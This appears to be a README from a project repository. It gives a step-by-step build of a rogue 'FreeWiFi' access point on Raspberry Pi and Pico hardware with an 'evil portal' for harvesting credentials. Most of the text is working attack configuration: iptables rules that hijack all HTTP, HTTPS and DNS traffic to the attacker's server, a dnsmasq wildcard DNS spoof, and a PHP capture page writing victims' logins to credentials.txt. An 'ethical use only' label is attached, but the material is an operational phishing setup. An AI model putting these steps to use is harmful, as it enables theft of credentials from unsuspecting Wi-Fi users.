# WiFi-Pinapple
Step-by-Step guide to create a wifi-pinapple using raspberry pi with Evil Portal feature. *Ethical use only*
You have to MANUALLY set up the IP, Gateway and DNS for the victim test device as in this setup i have set the IP assign to MANUAL. Check out the `Issues` at the bottom of this readme file guide.
If you dont get redirected to the evil page when opening any http/https website go to the ip `192.168.1.2/` manually and click on portal, the evil page will load. If you want to redirect then check if `iptables` is set correctly. this project is in contineous improvement but the basic Attack simulation works!!

---
## Devices i used
- Raspberry Pi Zero 2W
- Raspberry Pi Pico WH
- TP Link AC600 T2U Plus
- ssd1306 Oled module

---
## Devices Setup
### Zero 2W
Install raspberry pi os lite 32 bit and configure the wifi and ssh when flashing the image to the sd card in the raspberry pi official imager tool. Then connect to the pi using ssh from your PC.
Once you have booted the pi. do `sudo apt update && sudo apt upgrade -y` to update the system and packages. I will use an external wifi adapter as wlan1 (TP Link AC600 T2U plus).
Install these before continuing, ` sudo apt-get install dnsmasq apache2 php libapache2-mod-php -y`

#### TP link ac600 driver install
- First, `sudo apt update && sudo apt install -y build-essential raspberrypi-kernel-headers git dkms` and then reboot.
- download the github driver: ` sudo git clone https://github.com/aircrack-ng/rtl8812au.git`
- cd rtl8812au
- Now clean make to ensure no conflicting processes. `sudo make clean`
- Now `sudo make && sudo make install` to install the driver. *[NOTE: This takes a while, approx. 20-30 mins, don't worry\]* once done, reboot the pi and ensure by checking `iwconfig` or `ip addr show wlan1`.

### Pico WH
*[NOTE: Follow the `picoWH setup` file in this directory to setup AP for Wifi pinapple Evil portal feature\]*

### Configure wlan1 for Evil Portal
setup the wlan1 for static ip address and we will setup the landing page after redirections to our evil portal ip address to harvest credentials. In this project i have immitated a public wifi with free access.</br>
Connect the wlan1 to the pico's AP, `sudo nmcli device wifi connect "FreeWiFi" ifname wlan1`. </br>

Setup static ip for wlan1 :

- sudo nmcli connection modify "FreeWiFi" ipv4.addresses 192.168.1.2/24
- sudo nmcli connection modify "FreeWiFi" ipv4.gateway 192.168.1.1
- sudo nmcli connection modify "FreeWiFi" ipv4.dns 192.168.1.2
- sudo nmcli connection modify "FreeWiFi" ipv4.method manual
- sudo nmcli connection up "FreeWiFi"

#### Redirection and Evil Portal
- Clear duplicates and existing rules in `iptables`:
`sudo iptables -t nat -F`
`sudo iptables -F`
- Enable IP forwarding:
`sudo sysctl -w net.ipv4.ip_forward=1`
`sudo sh -c "echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf"`
- Add rules:</br>
```text
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.2:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 192.168.1.2:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p udp --dport 53 -j DNAT --to-destination 192.168.1.2:53
sudo iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o wlan1 -j ACCEPT
```
- Save:
`sudo mkdir -p /etc/iptables`
`sudo sh -c "iptables-save > /etc/iptables/rules.v4"`
- Enable persistence by `sudo apt install -y netfilter-persistent iptables-persistent` (click yes to overwrite the exixting iptable)
- You can verify by `sudo iptables -t nat -L -v -n` & `cat /etc/iptables/rules.v4`, if something is wrong go over the above steps again.

#### Configure Dnsmasq
Power off the pico before you do this step.</br>
Edit `dnsmasq.conf` and add the below lines:</br>
```text
interface=wlan1
dhcp-range=192.168.1.100,192.168.1.200,12h
address=/portal.local/192.168.1.2
address=/#/192.168.1.2
no-resolv
server=8.8.8.8
```
Now restart the dnsmasq, `sudo systemctl restart dnsmasq`.

#### Configure Apache2

- sudo systemctl enable apache2
- sudo systemctl start apache2
- sudo chown -R www-data:www-data /var/www/html
- sudo chmod -R 755 /var/www/html

Now save all the `files` from the portal folder in this repo to `/var/www/html/portal`. Now again set the below permissions to the portal dir:</br>
```text
sudo chown www-data:www-data /var/www/html/portal/capture.php
sudo chmod 644 /var/www/html/portal/capture.php
sudo touch /var/www/html/portal/credentials.txt
sudo chown www-data:www-data /var/www/html/portal/credentials.txt
sudo chmod 664 /var/www/html/portal/credentials.txt
```
Finally power the pico again and reconnect wlan1: `sudo nmcli device wifi connect "FreeWiFi" ifname wlan1`

---

Issues: 
- After connecting to the rogue AP on the victim test device ensure you set up the IP, Gateway and DNS yourself as in this project i have set the *dhcp to manual*.
- If its not redirecting to the evil portal page for harvesting credentials page (index.html on the apache server). Then ensure you have set the iptables correctly.
- You can fork this repo or open a new Issue.
